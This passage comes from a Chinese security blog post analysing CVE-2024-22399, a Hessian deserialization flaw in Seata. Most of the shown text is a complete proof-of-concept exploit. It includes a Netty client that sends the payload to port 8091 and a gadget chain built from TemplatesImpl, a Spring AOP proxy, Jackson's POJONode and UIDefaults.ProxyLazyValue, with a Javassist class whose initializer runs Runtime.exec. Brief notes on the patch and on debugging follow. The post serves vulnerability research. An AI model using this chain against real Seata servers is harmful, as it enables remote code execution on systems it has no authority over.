class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Bootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bootstrap</span>();</span><br><span class="line">            bootstrap.group(group)</span><br><span class="line">                    .channel(NioSocketChannel.class)</span><br><span class="line">                    .handler(<span class="keyword">new</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel ch)</span> &#123;</span><br><span class="line">                            ch.pipeline().addLast(<span class="keyword">new</span> <span class="title class_">POCByteEncoder</span>());</span><br><span class="line">                            ch.pipeline().addLast(<span class="keyword">new</span> <span class="title class_">PocSourceSender</span>());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">            <span class="comment">// 连接到服务器</span></span><br><span class="line">            <span class="type">ChannelFuture</span> <span class="variable">future</span> <span class="operator">=</span> bootstrap.connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8091</span>).sync();</span><br><span class="line">            <span class="comment">// 等待连接关闭</span></span><br><span class="line">            future.channel().closeFuture().sync();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            group.shutdownGracefully();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>生成最终hessian序列化字节的方法如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getPocbyte()<span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        SerializerFactory serializerFactory=<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getEvilTemplatesByte()&#125;);</span><br><span class="line">        setFieldValue(templatesImpl,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templatesImpl);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxyObj</span> <span class="operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxyObj);</span><br><span class="line">        setFieldValue(poc,<span class="string">&quot;val&quot;</span>,jsonNodes);</span><br><span class="line">        <span class="type">byte</span>[] data = serializer(poc);</span><br><span class="line"></span><br><span class="line">        UIDefaults.ProxyLazyValue proxyLazyValue=<span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(SerializationUtils.class.getName(), <span class="string">&quot;deserialize&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;data&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//proxyLazyValue中有一段属性值acc会受到hessian序列化的影响，这里直接制空</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">accField</span> <span class="operator">=</span> UIDefaults.ProxyLazyValue.class.getDeclaredField(<span class="string">&quot;acc&quot;</span>);</span><br><span class="line">        accField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        accField.set(proxyLazyValue, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">u1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        u1.put(<span class="string">&quot;aaa&quot;</span>, proxyLazyValue);</span><br><span class="line"></span><br><span class="line">        MimeTypeParameterList mimeTypeParameterList=<span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">        setFieldValue(mimeTypeParameterList,<span class="string">&quot;parameters&quot;</span>,u1);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] malformedData = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">67</span>&#125;;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        Hessian2Output hessian2Output=<span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(bao);</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessian2Output.writeObject(mimeTypeParameterList);</span><br><span class="line">        hessian2Output.flush();</span><br><span class="line">        hessian2Output.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] normalbyte=bao.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] combineByte=<span class="keyword">new</span> <span class="title class_">byte</span>[malformedData.length+normalbyte.length];</span><br><span class="line">        System.arraycopy(malformedData, <span class="number">0</span>, combineByte, <span class="number">0</span>, malformedData.length);</span><br><span class="line">        System.arraycopy(normalbyte, <span class="number">0</span>, combineByte, malformedData.length, normalbyte.length);</span><br><span class="line">        <span class="keyword">return</span> combineByte;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilTemplatesByte() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;i&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;touch /tmp/stoocea\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>本地测试成功</p>
<p><img src="/images/seata/assets/image-20241101171336-l3i56ua.png" alt="image">​</p>
<p>‍</p>
<h2 id="0x04-patch分析"><a href="#0x04-patch分析" class="headerlink" title="0x04 patch分析"></a>0x04 patch分析</h2><p>感觉没必要聊，本质上没有patch，打的黑名单Runtime早在内置hessian的内存黑名单里面写了。</p>
<p>‍</p>
<h2 id="0x05-总结-后记"><a href="#0x05-总结-后记" class="headerlink" title="0x05 总结-后记"></a>0x05 总结-后记</h2><p>这里经过了两天的测试我是没有打成功的。期间思考了很多问题，比如是spring原生依赖链问题（一开始没有进行稳定性构造）。然后一开始用的是MethodUtils的invoke方法调用Runtime执行命令，这个也不行，因为hessian在某一个版本（具体还没测试完毕具体是哪个版本，详情见我另一篇要上线的hessian扩展）就已经给Runtime加上了一个static内置黑名单，在反序列化的时候会自动识别成hashmap类型，seata内置的hessian就正好在这个版本区间，所以这个方法也不行。</p>
<p>然后又注意到HessianClient端的调用getPocbyte()方法生成的序列化字节是4000多，但是我本身测试类调用却只有2000字节，甚至开始是不是字节输出流没有关闭导致了写了两次（xiao</p>
<p>当我客户端做完一一切工作之后，数据打过去，发现还是无法执行。首先就是开始调试进行问题排查，发现我远程调试的源码的hessian是alipha下的hessian跟caucho中的hessian有很大的差异，代码对不上，并且我物理机的idea接收到docker发送过来的操作信号，在断点的时候会被断到alipha下的hessian源码，导致调试出大问题。这里我发现seata源码本身是有caucho的hesisan的，所以我删除了其他的hessian依赖，只用caucho中的hessian（原本漏洞点的hessian2input就是caucho的），发现可以正常调试。终于经过一轮排查，我找到了问题所在，但是我不太懂这些开发原理，总的来说就是<a target="_blank" rel="noopener" href="https://github.com/sofastack/sofa-bolt/issues/338%E8%BF%99%E4%B8%AAissues%E9%87%8C%E9%9D%A2%E6%8F%90%E5%88%B0%E7%9A%84hessian%E6%9F%90%E4%B8%80%E4%B8%AAdeserializer%E4%BE%9D%E8%B5%96%E5%86%B2%E7%AA%81%EF%BC%8C%E5%AF%BC%E8%87%B4%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%88%B0%EF%BC%8C%E6%88%91%E4%BB%AC%E8%BF%98%E6%B2%A1%E7%BB%8F%E8%BF%87%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96jvm%E5%B0%B1hook%E4%BA%86%E3%80%82%E4%BA%8E%E6%98%AF%E7%89%88%E6%9C%AC%E5%88%87%E6%8D%A2%E8%87%B31.8.0%E7%89%88%E6%9C%AC%EF%BC%8C%E6%88%90%E5%8A%9F%E6%89%93%E9%80%9A%E3%80%82%E6%89%80%E4%BB%A5%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%E5%85%B6%E5%AE%9E%E8%BF%98%E6%98%AF%E5%AD%98%E7%96%91%E7%9A%84%EF%BC%8C%E8%87%B3%E5%B0%912.0.0%E4%B9%8B%E5%90%8E%E5%8F%8A%E6%9C%AC%E8%BA%AB%E7%9A%84%E7%89%88%E6%9C%AC%E9%83%BD%E5%AD%98%E5%9C%A8%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98%E3%80%82">https://github.com/sofastack/sofa-bolt/issues/338这个issues里面提到的hessian某一个deserializer依赖冲突，导致加载不到，我们还没经过反序列化jvm就hook了。于是版本切换至1.8.0版本，成功打通。所以影响版本其实还是存疑的，至少2.0.0之后及本身的版本都存在这个问题。</a></p>
<p>所以hessian这个地方还是有很多可以深挖的地方的，但是有很多关键和大型项目也注意到了这个问题，确实不太安全，但是有效patch还是很少的，所以深挖hessian的利用还是很有用的，也很有趣，是时候整理这一部分的知识了。</p>
<p>‍</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/post/ActiveMQ%20CVE-2023-46604%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
              2024-11-01 17:42:40
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags mr-10" title="标签"></i>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/Seata/" title="Seata">
                        #Seata
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/post/%E5%9C%A8%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99.html" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-sink%E7%82%B9diff"><span class="toc-text">0x01 sink点diff</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%90%91%E4%B8%8A%E8%B0%83%E7%94%A8%E5%AF%BB%E6%89%BE"><span class="toc-text">0x02 向上调用寻找</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E5%85%A5%E5%8F%A3%E8%A7%A3%E6%9E%90"><span class="toc-text">1x01 入口解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-poc%E6%9E%84%E9%80%A0"><span class="toc-text">0x03 poc构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E8%AF%B7%E6%B1%82%E5%B0%81%E8%A3%85%E6%95%B0%E6%8D%AE%E6%9E%84%E9%80%A0"><span class="toc-text">1x01 请求封装数据构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2x01-hesssian%E5%8D%8F%E8%AE%AE%E8%AF%86%E5%88%AB%E7%AC%A6"><span class="toc-text">2x01 hesssian协议识别符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2x02-hessian%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E6%9E%84%E9%80%A0"><span class="toc-text">2x02 hessian序列化数据构造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1x02-%E8%AF%B7%E6%B1%82%E7%BC%96%E7%A0%81%EF%BC%8C%E4%B9%9F%E5%8D%B3%E6%9C%80%E7%BB%88POC"><span class="toc-text">1x02 请求编码，也即最终POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-patch%E5%88%86%E6%9E%90"><span class="toc-text">0x04 patch分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%80%BB%E7%BB%93-%E5%90%8E%E8%AE%B0"><span class="toc-text">0x05 总结-后记</span></a></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + CVE-2024-22399%20Seata%20Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90 + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2FCVE-2024-22399%2520Seata%2520Hessian%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%25BC%258F%25E6%25B4%259E%25E5%2588%2586%25E6%259E%2590.html + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/CVE-2024-22399%20Seata%20Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
